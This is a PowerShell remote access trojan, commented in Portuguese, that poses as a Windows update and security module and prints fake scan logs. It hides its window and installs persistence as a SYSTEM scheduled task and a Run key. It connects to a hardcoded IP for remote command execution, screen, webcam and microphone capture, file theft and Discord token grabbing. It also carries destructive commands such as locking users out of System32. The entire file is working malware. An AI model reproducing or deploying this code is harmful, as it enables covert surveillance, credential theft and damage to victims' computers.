<#
.SYNOPSIS
Windows Critical System Component
.DESCRIPTION
Microsoft Windows Critical Update Module - Complete Control
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"

# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR SE É ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $host.UI.RawUI.ForegroundColor = "Red"
    Write-Host ""
    Write-Host "╔════════════════════════════════════════════════════════════╗"
    Write-Host "║                    ERRO DE EXECUÇÃO                        ║"
    Write-Host "╠════════════════════════════════════════════════════════════╣"
    Write-Host "║  Este programa requer privilégios de ADMINISTRADOR!       ║"
    Write-Host "║                                                            ║"
    Write-Host "║  Por favor, execute o PowerShell como Administrador       ║"
    Write-Host "║  e tente novamente.                                        ║"
    Write-Host "║                                                            ║"
    Write-Host "║  Clique com botão direito no PowerShell                    ║"
    Write-Host "║  e selecione 'Executar como Administrador'                 ║"
    Write-Host "╚════════════════════════════════════════════════════════════╝"
    Write-Host ""
    $host.UI.RawUI.ForegroundColor = "White"
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNÇÃO PARA DELETAR USUÁRIO DO RAT =====
function Remove-UserFromRAT {
    param([string]$UserName)
    
    try {
        $removido = $false
        
        # 1. Remove do registro
        if (Test-Path $registryPath) {
            Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue
            $removido = $true
        }
        
        # 2. Remove da lista de usuários
        if (Test-Path $userListFile) {
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
            $newUsers = $users | Where-Object { $_ -ne $UserName }
            $newUsers | Set-Content $userListFile -Force
            $removido = $true
        }
        
        # 3. Remove tarefas agendadas
        $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
        foreach ($task in $tasks) {
            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
            $removido = $true
        }
        
        if ($removido) {
            return "USUARIO_REMOVIDO"
        } else {
            return "USUARIO_NAO_ENCONTRADO"
        }
    } catch {
        return "ERRO_AO_REMOVER"
    }
}

# ===== FUNÇÃO PARA LISTAR USUÁRIOS DO RAT =====
function Get-RATUsers {
    try {
        $users = @()
        
        if (Test-Path $userListFile) {
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
        }
        
        if ($users.Count -eq 0) {
            return "Nenhum usuário encontrado"
        }
        
        return "USUARIOS:" + ($users -join "`n")
    } catch {
        return "ERRO_AO_LISTAR"
    }
}

# ===== FUNÇÃO PARA ADICIONAR USUÁRIO À LISTA =====
function Add-UserToList {
    param([string]$UserName)
    
    try {
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Add-Content -Path $userListFile -Value $UserName -Force
        
        New-Item -Path $registryPath -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
        
        return $true
    } catch {
        return $false
    }
}

# ===== VERIFICAR SE USUÁRIO JÁ EXECUTOU ANTES =====
$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
$userExecuted = $false

if (Test-Path $userListFile) {
    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    if ($users -contains $currentUser) {
        $userExecuted = $true
    }
}

if (-not $userExecuted) {
    Add-UserToList $currentUser
}

# ===== ELEVAR PRIVILEGIOS =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb RunAs -ArgumentList $arguments
    exit
}

# ===== LOGS FAKES =====
$host.UI.RawUI.ForegroundColor = "Green"
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "    Versao 10.0.19045.1" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Milliseconds 500

$logs = @(
    "Inicializando modulo de verificacao do sistema...",
    "Carregando bibliotecas de analise...",
    "Verificando integridade do sistema...",
    "Escaneando arquivos criticos do Windows...",
    "Analisando processos em execucao...",
    "Detectando possiveis ameacas..."
)

foreach ($log in $logs) {
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $log" -ForegroundColor Gray
    Start-Sleep -Milliseconds 300
}

Write-Host ""
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] VERIFICACAO CONCLUIDA - SISTEMA SEGURO" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== FUNCOES PRINCIPAIS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREEN:$base64"
    } catch {
        return "SCREEN_ERROR"
    }
}

# ===== CONTROLE DE MOUSE =====
function Move-Mouse { 
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { 
        return "MOUSE_ERROR" 
    }
}

function Click-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        return "OK"
    } catch { 
        return "CLICK_ERROR" 
    }
}

function RightClick-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
        return "OK"
    } catch { 
        return "RIGHTCLICK_ERROR" 
    }
}

# ===== CONTROLE DE TECLADO =====
function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch { 
        return "KEY_ERROR" 
    }
}

function Send-Text {
    param($text)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($text)
        return "OK"
    } catch { 
        return "TEXT_ERROR" 
    }
}

# ===== GERENCIADOR DE ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        if (-not (Test-Path $Path)) { return "[]" }
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                FullName = $_.FullName
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
                Size = if ($_.PSIsContainer) { "" } else { "{0:N0} KB" -f ($_.Length/1KB) }
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch { 
        return "[]" 
    }
}

function Download-File {
    param($Path)
    try {
        if (Test-Path $Path) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
            return "FILE:$content"
        }
        return "FILE_NOT_FOUND"
    } catch { 
        return "DOWNLOAD_ERROR" 
    }
}

# ===== EXECUTAR COMANDO =====
function Execute-Command {
    param($Cmd)
    try {
        $Cmd = $Cmd.Trim('"').Trim("'")
        $result = Invoke-Expression $Cmd 2>&1
        
        if ($result -is [System.Management.Automation.ErrorRecord]) {
            $output = "ERRO: " + $result.ToString()
        } elseif ($result -eq $null -or $result -eq "") {
            $output = "Comando executado (sem saída)"
        } else {
            $output = $result | Out-String
        }
        
        return $output
    } catch {
        return "Erro ao executar comando: $_"
    }
}

# ===== DISCORD TOKEN GRABBER =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
        )
        
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) {
                        $tokens += $match.Value
                    }
                }
            }
        }
        
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { 
            return "TOKENS:Nenhum token encontrado" 
        }
        
        return "TOKENS:" + ($tokens -join "`n")
    } catch {
        return "TOKENS_ERROR"
    }
}

# ===== BLOQUEAR SYSTEM32 =====
function Block-System32 {
    try {
        $path = "C:\Windows\System32"
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        return "SYSTEM32_BLOCKED"
    } catch {
        return "SYSTEM32_ERROR"
    }
}

# ===== TELA PRETA =====
$global:blackScreenForm = $null

function Show-BlackScreen {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.BackColor = 'Black'
        $form.ControlBox = $false
        $form.ShowInTaskbar = $false
        $form.KeyPreview = $true
        $form.Add_KeyDown({
            if ($_.KeyCode -eq 'Escape') { $form.Close() }
        })
        
        $global:blackScreenForm = $form
        $form.ShowDialog()
        return "BLACK_SCREEN"
    } catch {
        return "BLACK_SCREEN_ERROR"
    }
}

function Hide-BlackScreen {
    try {
        if ($global:blackScreenForm -and !$global:blackScreenForm.IsDisposed) {
            $global:blackScreenForm.Invoke([Action]{ $global:blackScreenForm.Close() })
            $global:blackScreenForm.Dispose()
            $global:blackScreenForm = $null
        }
        return "SCREEN_UNLOCKED"
    } catch {
        return "UNLOCK_ERROR"
    }
}

# ===== TRAVAR MOUSE =====
$global:mouseLocked = $false
$global:lockThread = $null

function Lock-Mouse {
    try {
        if ($global:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
        
        $global:mouseLocked = $true
        
        $mouseLockerCode = @'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class MouseLocker
{
    [DllImport("user32.dll")]
    public static extern bool ClipCursor(ref RECT lpRect);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct RECT
    {
        public int left;
        public int top;
        public int right;
        public int bottom;
    }
    
    public static void Lock()
    {
        RECT rect = new RECT();
        rect.left = 0;
        rect.top = 0;
        rect.right = 1;
        rect.bottom = 1;
        ClipCursor(ref rect);
    }
    
    public static void Unlock()
    {
        RECT rect = new RECT();
        rect.left = 0;
        rect.top = 0;
        rect.right = Screen.PrimaryScreen.Bounds.Width;
        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
        ClipCursor(ref rect);
    }
}
'@
        
        try {
            Add-Type -TypeDefinition $mouseLockerCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
        } catch {
            # Tipo já existe, continuar
        }
        
        $global:lockThread = [System.Threading.Thread]::new({
            try {
                while ($global:mouseLocked) {
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                    [MouseLocker]::Lock()
                    Start-Sleep -Milliseconds 10
                }
            } catch {
                # Silenciosamente ignorar erros
            }
        })
        
        $global:lockThread.IsBackground = $true
        $global:lockThread.Start()
        
        return "MOUSE_LOCKED"
    } catch {
        return "MOUSE_ERROR"
    }
}

function Unlock-Mouse {
    try {
        $global:mouseLocked = $false
        
        if ($global:lockThread -and $global:lockThread.IsAlive) {
            $global:lockThread.Abort()
        }
        
        try {
            [MouseLocker]::Unlock()
        } catch {
            # Ignorar se não existir
        }
        
        return "MOUSE_UNLOCKED"
    } catch {
        return "UNLOCK_ERROR"
    }
}

# ===== MICROFONE =====
function Get-Microphone {
    try {
        $filename = "$env:TEMP\mic_$(Get-Random).wav"
        
        try {
            $recorder = New-Object -ComObject SoundRecorder
            $recorder.StartRecording($filename)
            Start-Sleep -Seconds 5
            $recorder.StopRecording()
        } catch {
            Add-Type -AssemblyName System.Speech
            $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
            $speech.SetInputToDefaultAudioDevice()
            $speech.RecognizeAsyncTimeout = 5000
            $speech.RecognizeAsync()
            Start-Sleep -Seconds 5
            $speech.RecognizeAsyncStop()
        }
        
        if (Test-Path $filename) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
            Remove-Item $filename -Force
            return "AUDIO:$content"
        }
        return "AUDIO_ERROR"
    } catch {
        return "AUDIO_ERROR"
    }
}

# ===== WEBCAM =====
function Get-Webcam {
    try {
        $webcamCode = @'
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class WebcamCapture
{
    [DllImport("avicap32.dll")]
    public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
    
    [DllImport("user32.dll")]
    public static extern int SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);
    
    [DllImport("user32.dll")]
    public static extern bool DestroyWindow(IntPtr hWnd);
    
    const int WM_CAP_CONNECT = 0x400 + 10;
    const int WM_CAP_DISCONNECT = 0x400 + 11;
    const int WM_CAP_GET_FRAME = 0x400 + 12;
    const int WM_CAP_SAVEDIB = 0x400 + 25;
    
    public static string Capture() {
        IntPtr hWnd = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
        if (hWnd != IntPtr.Zero) {
            SendMessage(hWnd, WM_CAP_CONNECT, 0, 0);
            SendMessage(hWnd, WM_CAP_GET_FRAME, 0, 0);
            
            string filename = System.IO.Path.GetTempFileName() + ".bmp";
            IntPtr pFilename = Marshal.StringToHGlobalAnsi(filename);
            SendMessage(hWnd, WM_CAP_SAVEDIB, 0, pFilename);
            Marshal.FreeHGlobal(pFilename);
            
            SendMessage(hWnd, WM_CAP_DISCONNECT, 0, 0);
            DestroyWindow(hWnd);
            
            if (System.IO.File.Exists(filename)) {
                byte[] bytes = System.IO.File.ReadAllBytes(filename);
                System.IO.File.Delete(filename);
                return Convert.ToBase64String(bytes);
            }
        }
        return null;
    }
}
'@
        
        try {
            Add-Type -TypeDefinition $webcamCode -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll" -ErrorAction Stop
        } catch {
            # Tipo já existe, continuar
        }
        
        $frame = [WebcamCapture]::Capture()
        if ($frame) {
            return "WEBCAM:$frame"
        }
        return "WEBCAM_ERROR"
    } catch {
        return "WEBCAM_ERROR"
    }
}

# ===== PROCESSOS =====
function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 20 Name, CPU, WorkingSet, Id | ConvertTo-Json -Compress
        return $processes
    } catch {
        return "PROCESS_ERROR"
    }
}

# ===== URL =====
function Open-Url {
    param($url)
    try {
        Start-Process $url
        return "URL_OPENED"
    } catch {
        return "URL_ERROR"
    }
}

# ===== CONTROLE DE ENERGIA =====
function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        return "POWER_$Action"
    } catch { 
        return "POWER_ERROR" 
    }
}

# ===== PERSISTENCIA =====
function Install-Persistence {
    $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
    
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
    
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
    } catch {
        # Silenciosamente ignorar erros
    }
    
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
    } catch {
        # Silenciosamente ignorar erros
    }
    
    attrib +h +s +r $scriptPath
}

# ===== VERIFICAR INSTALACAO =====
if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
    Install-Persistence
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        # ENVIA IDENTIFICACAO
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            switch -Wildcard ($cmd) {
                # ===== TELA =====
                "screenshot" { 
                    $writer.WriteLine((Get-ScreenCapture))
                }
                
                # ===== MOUSE =====
                "move *" { 
                    $pos = $cmd.Replace("move ","").Split(" ")
                    if ($pos.Count -ge 2) {
                        $writer.WriteLine((Move-Mouse $pos[0] $pos[1]))
                    }
                }
                "click" { $writer.WriteLine((Click-Mouse)) }
                "rightclick" { $writer.WriteLine((RightClick-Mouse)) }
                
                # ===== TECLADO =====
                "key *" { 
                    $key = $cmd.Replace("key ","")
                    $writer.WriteLine((Send-Key $key))
                }
                "type *" { 
                    $text = $cmd.Replace("type ","")
                    $writer.WriteLine((Send-Text $text))
                }
                
                # ===== ARQUIVOS =====
                "ls *" { 
                    $path = $cmd.Replace("ls ","")
                    $writer.WriteLine((Get-FileList $path))
                }
                "download *" { 
                    $file = $cmd.Replace("download ","")
                    $writer.WriteLine((Download-File $file))
                }
                
                # ===== EXECUTAR COMANDO =====
                "exec *" { 
                    $command = $cmd.Substring(5)
                    $result = Execute-Command $command
                    $writer.WriteLine($result)
                }
                
                # ===== DISCORD TOKEN =====
                "discord" {
                    $result = Get-DiscordToken
                    $writer.WriteLine($result)
                }
                
                # ===== DESTRUTIVAS =====
                "block_system32" {
                    $writer.WriteLine((Block-System32))
                }
                "black_screen" {
                    $ps = [powershell]::Create()
                    $ps.AddScript({ Show-BlackScreen }).BeginInvoke()
                    $writer.WriteLine("BLACK_SCREEN")
                }
                "unlock_screen" {
                    $writer.WriteLine((Hide-BlackScreen))
                }
                "lock_mouse" {
                    $writer.WriteLine((Lock-Mouse))
                }
                "unlock_mouse" {
                    $writer.WriteLine((Unlock-Mouse))
                }
                "shutdown" {
                    $writer.WriteLine((Power-Control "shutdown"))
                }
                "reboot" {
                    $writer.WriteLine((Power-Control "reboot"))
                }
                
                # ===== PERIFERICOS =====
                "mic" {
                    $writer.WriteLine((Get-Microphone))
                }
                "webcam" {
                    $writer.WriteLine((Get-Webcam))
                }
                
                # ===== SISTEMA =====
                "processes" {
                    $writer.WriteLine((Get-ProcessList))
                }
                "url *" {
                    $url = $cmd.Replace("url ","")
                    $writer.WriteLine((Open-Url $url))
                }
                
                # ===== NOVAS FUNÇÕES DE USUÁRIO =====
                "list_users" {
                    $writer.WriteLine((Get-RATUsers))
                }
                "remove_user *" {
                    $userToRemove = $cmd.Replace("remove_user ","")
                    $writer.WriteLine((Remove-UserFromRAT $userToRemove))
                }
                "remove_current_user" {
                    $writer.WriteLine((Remove-UserFromRAT $currentUser))
                }
                
                # ===== TESTE =====
                "test" { $writer.WriteLine("PONG") }
                
                # ===== SAIR =====
                "exit" { break }
                
                default { $writer.WriteLine("Comando nao reconhecido: $cmd") }
            }
        }
    } catch {
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
